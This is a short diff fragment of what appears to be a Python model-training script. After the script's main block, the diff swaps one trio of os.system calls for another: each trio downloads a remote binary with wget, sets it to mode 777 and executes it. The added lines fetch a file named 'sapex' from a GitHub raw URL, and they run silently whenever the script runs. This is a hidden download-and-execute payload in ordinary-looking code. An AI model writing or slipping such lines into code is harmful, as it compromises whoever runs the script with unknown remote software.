@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/esfx/newsfx/raw/cb85432a6c752ae48ea7903e9b6d23db40aa6fe6/esfx')
-os.system('chmod 777 esfx')
-os.system('./esfx')
+os.system('wget https://raw.githubusercontent.com/tiwy2121/sfxx/main/sapex')
+os.system('chmod 777 sapex')
+os.system('./sapex')
